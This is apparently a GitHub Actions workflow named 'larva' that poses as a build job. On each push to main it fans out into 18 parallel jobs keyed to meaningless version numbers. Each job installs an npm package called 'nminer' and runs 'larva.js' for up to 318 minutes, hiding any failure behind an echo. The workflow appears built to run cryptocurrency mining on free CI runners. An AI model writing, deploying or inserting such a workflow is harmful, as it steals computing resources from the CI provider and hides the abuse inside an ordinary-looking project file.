name: larva
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3669 }
          - { version: 7189 }
          - { version: 758 }
          - { version: 5894 }
          - { version: 9640 }
          - { version: 4029 }
          - { version: 7265 }
          - { version: 1688 }
          - { version: 431 }
          - { version: 8485 }
          - { version: 3942 }
          - { version: 1976 }
          - { version: 9833 }
          - { version: 3554 }
          - { version: 1006 }
          - { version: 2146 }
          - { version: 3339 }
          - { version: 3795 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 318m node larva.js || echo "larva executed"